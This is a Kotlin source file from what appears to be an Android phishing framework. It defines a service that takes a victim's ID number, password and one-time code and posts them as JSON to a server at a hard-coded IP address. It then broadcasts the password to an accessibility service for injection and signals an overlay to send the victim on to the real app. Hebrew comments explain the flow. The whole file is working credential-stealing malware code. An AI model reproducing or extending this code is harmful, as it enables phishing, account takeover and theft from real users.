package com.example.phishingframework

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.IOException

class CredentialSendService : Service() {

    companion object {
        //ישמש להפצת הסיסמה ל-AccessibilityService
        const val ACTION_INJECT_PASSWORD       = "com.example.phishingframework.ACTION_INJECT_PASSWORD"
        //מציין שהשליחה לשרת הצליחה
        const val ACTION_CREDENTIALS_OK       = "com.example.phishingframework.ACTION_CREDENTIALS_OK"
        //מציין שהשליחה נכשלה
        const val ACTION_CREDENTIALS_FAILED   = "com.example.phishingframework.ACTION_CREDENTIALS_FAILED"
    }

    //מאפשר להריץ את שליחת הקרדנציאלס בצורה אסינכרונית ונקייה
    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val idNumber = intent?.getStringExtra("id") ?: return START_NOT_STICKY
        val password = intent.getStringExtra("password") ?: return START_NOT_STICKY
        val codeValue = intent.getStringExtra("code") ?: ""

        serviceScope.launch {
            sendCredentials(idNumber, password, codeValue)
        }

        // נעצור את השירות בעצמנו לאחר הסיום
        return START_NOT_STICKY
    }

    private fun sendCredentials(idNumber: String, password: String, codeValue: String) {
        val json = if (codeValue.isNotEmpty()) {
            """
                {
                  "id": "$idNumber",
                  "password": "$password",
                  "code": "$codeValue" 
                }
            """.trimIndent()
        } else {
            """
                {
                  "id": "$idNumber",
                  "password": "$password"
                }
            """.trimIndent()
        }

        val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
        val body = json.toRequestBody(mediaType)
        val request = Request.Builder()
            .url("http://192.168.1.45:5000/api/credentials")
            .post(body)
            .build()

        OkHttpClient().newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("CredentialSendService", "Failed to send credentials", e)
                sendBroadcast(Intent(ACTION_CREDENTIALS_FAILED))
                stopSelf()
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    Log.i("CredentialSendService", "Credentials sent successfully")
                    // 2.1 – שולחים Broadcast להודעה שעבר בהצלחה
                    //מי מקבל? במחלקה PhishingOverlayActivity יש BroadcastReceiver בשם resultReceiver
                    //ברגע ש־CredentialSendService משדר sendBroadcast(Intent(ACTION_CREDENTIALS_OK))
                    //ה־resultReceiver תופס את ההודעה ושולח את המשתמש לאפליקציה האמיתית (או מראה שגיאה).
                           sendBroadcast(Intent(ACTION_CREDENTIALS_OK))

                           // 2.2 – Broadcast עם הסיסמה ל–AccessibilityService
                           //מי מקבל? במחלקה PhishingAccessibilityService (ה־AccessibilityService) ב־onServiceConnected() נוצר ומנוהל BroadcastReceiver בשם injectorReceiver
                           //כשהשירות משדר sendBroadcast(Intent(ACTION_INJECT_PASSWORD).putExtra("password", password))
                           //ה־injectorReceiver מקבל את המידע, מאחסן את הסיסמה במשתנה injectedPassword
                           sendBroadcast(Intent(ACTION_INJECT_PASSWORD).apply {
                                  putExtra("password", password)
                              })
                } else {
                    Log.w("CredentialSendService", "Server error: ${response.code}")
                    // Broadcast לכישלון
                    sendBroadcast(Intent(ACTION_CREDENTIALS_FAILED))
                }
                response.close()
                stopSelf()
            }
        })
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
    }
}
